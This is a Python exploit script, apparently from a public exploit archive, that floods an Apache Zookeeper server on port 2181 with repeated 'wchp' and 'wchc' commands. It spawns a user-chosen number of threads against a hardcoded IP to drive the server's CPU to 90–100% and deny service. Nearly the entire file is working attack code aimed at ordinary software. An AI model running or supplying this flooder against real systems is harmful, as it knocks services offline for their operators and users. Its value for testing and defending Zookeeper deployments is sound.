#!/usr/bin/python

# Exploit Title: Zookeeper Client Denial Of Service (Port 2181)
# Date: 2/7/2017
# Exploit Author: Brandon Dennis
# Email: bdennis@mail.hodges.edu
# Software Link: http://zookeeper.apache.org/releases.html#download
# Zookeeper Version: 3.5.2
# Tested on: Windows 2008 R2, Windows 2012 R2 x64 & x86
# Description: The wchp command to the ZK port 2181 will gather open internal files by each session/watcher and organize them for the requesting client. 
#	This command is CPU intensive and will cause a denial of service to the port as well as spike the CPU of the remote machine to 90-100% consistently before any other traffic. 
#	The average amount of threads uses was 10000 for testing. This should work on all 3.x+ versions of Zookeeper.
#	This should effect Linux x86 & x64 as well




import time
import os
import threading
import sys
import socket

numOfThreads = 1
exitStr = "n"
stop_threads = False
threads = []
ipAddress = "192.168.1.5" #Change this
port = 2181

def sendCommand(ipAddress, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ipAddress, port))
		s.send("wchp\r".encode("utf-8"))
		s.recv(1024)
		s.send("wchc\r".encode("utf-8"))
		s.close()
	except:
		pass

	
def runCMD(id, stop, ipAddress, port):
	while True:
		sendCommand(ipAddress, port)
		if stop():
			break
	return
	
def welcomeBanner():
	banner = """ _______   __  _____               _               
|___  | | / / /  __ \             | |              
   / /| |/ /  | /  \/_ __ __ _ ___| |__   ___ _ __ 
  / / |    \  | |   | '__/ _` / __| '_ \ / _ | '__|
./ /__| |\  \ | \__/| | | (_| \__ | | | |  __| |   
\_____\_| \_/  \____|_|  \__,_|___|_| |_|\___|_|   
                                                   
                 By: Brandon Dennis 
		 Email: bdennis@mail.hodges.edu
				 """
	print(banner)
	

welcomeBanner()
numOfThreads = int(input("How many threads do you want to use: "))
print ("Startin Up Threads...")	
for i in range(numOfThreads):
	t = threading.Thread(target=runCMD, args=(id, lambda: stop_threads, ipAddress, port))
	threads.append(t)
	t.start()
print("Threads are now started...")
	

while exitStr != "y":
	inpt = input("Do you wish to stop threads(y): ")
	
	if inpt == "y":
		exitStr = "y"

print("\nStopping Threads...")
stop_threads = True		
for thread in threads:
	thread.join()
		
print("Threads are now stopped...")
sys.exit(0);

